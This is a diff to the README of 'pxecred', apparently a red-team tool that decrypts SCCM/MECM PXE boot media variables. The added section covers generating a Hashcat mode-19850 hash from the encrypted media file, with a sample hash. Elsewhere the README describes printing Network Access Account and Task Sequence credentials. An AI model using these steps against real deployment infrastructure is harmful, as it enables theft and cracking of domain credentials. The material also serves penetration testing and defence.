@@ -12,7 +12,22 @@ the distribution point with TFTP or another PXE extraction method. Once you have
 it, `pxecred` decrypts it natively on Linux/macOS and extracts the media PFX from
 `_SMSTSMediaPFX`.
 
-## 2. Run
+## 2. Generate the Hashcat hash
+
+Generate the mode-19850 hash from an encrypted media variables file:
+
+```bash
+python3 pxecred.py --hashcat media.boot.var
+```
+
+```text
+$sccm$aes128$0000edec1400000010340000203400000e66000000000000f4aa05d12d6facd1856ed8f2fe6cfa41
+```
+
+The `.boot.bcd` downloaded with the media is a Windows registry hive (`regf`),
+not the encrypted media variables file; it cannot produce a `$sccm$aes128$` hash.
+
+## 3. Run
 
 Decrypt the media variables and retrieve policies in one step:
 
@@ -47,7 +62,7 @@ what MECM uses for the media certificate. Override it only if your PFX differs:
 python3 pxecred.py --pfx custom.pfx --pfx-password '...'
 ```
 
-## 3. Output
+## 4. Output
 
 `pxecred` prints NAA and Task Sequence credentials and writes decrypted policies:
 
